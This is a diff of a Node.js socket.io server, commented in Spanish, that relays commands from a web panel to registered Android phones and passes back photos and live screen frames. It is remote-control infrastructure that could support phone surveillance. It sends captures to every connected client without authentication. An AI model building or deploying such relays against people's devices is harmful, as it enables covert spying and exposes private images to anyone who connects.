@@ -8,39 +8,47 @@ const io = new Server(server);
 
 app.use(express.static('public'));
 
-let connectedDevices = [];
+let connectedDevices = new Map(); // Guardará socket.id -> info del celular
 
 io.on('connection', (socket) => {
-    socket.on('register_phone', (data) => {
-        socket.deviceName = data.name || "Android Device";
-        socket.deviceIp = socket.handshake.address;
+    console.log(`[+] Conexión establecida: ${socket.id}`);
 
-        connectedDevices = connectedDevices.filter(dev => dev.id !== socket.id);
-        
-        connectedDevices.push({ 
-            id: socket.id, 
-            name: socket.deviceName, 
-            ip: socket.deviceIp 
+    // El celular se registra al abrir la app
+    socket.on('register_phone', (data) => {
+        connectedDevices.set(socket.id, {
+            id: socket.id,
+            name: data.name || `Android Device (${socket.id.substring(0, 4)})`,
+            ip: socket.handshake.address
         });
-        
-        io.emit('update_devices', connectedDevices);
+        console.log(`[📱] Celular registrado: ${socket.id}`);
+        io.emit('update_devices', Array.from(connectedDevices.values()));
     });
 
+    // Enviar comando dirigido a un celular específico desde el panel web
     socket.on('send_command_to_device', (data) => {
+        console.log(`[>] Enviando comando (${data.action}) al celular: ${data.targetId}`);
         io.to(data.targetId).emit('command_to_phone', { action: data.action });
     });
 
+    // Recibir la respuesta del celular (ej. la foto) y mandarla a la web
     socket.on('phone_response', (response) => {
+        console.log(`[<] Respuesta recibida del celular`);
         io.emit('phone_response', response);
     });
 
+    // Transmisión de pantalla en tiempo real
     socket.on('screen_frame', (base64Frame) => {
         io.emit('screen_frame', base64Frame);
     });
 
     socket.on('disconnect', () => {
-        connectedDevices = connectedDevices.filter(dev => dev.id !== socket.id);
-        io.emit('update_devices', connectedDevices);
+        if (connectedDevices.has(socket.id)) {
+            connectedDevices.delete(socket.id);
+            console.log(`[-] Celular desconectado: ${socket.id}`);
+            io.emit('update_devices', Array.from(connectedDevices.values()));
+        } else {
+            console.log(`[-] Panel web desconectado: ${socket.id}`);
+        }
     });
 });
 
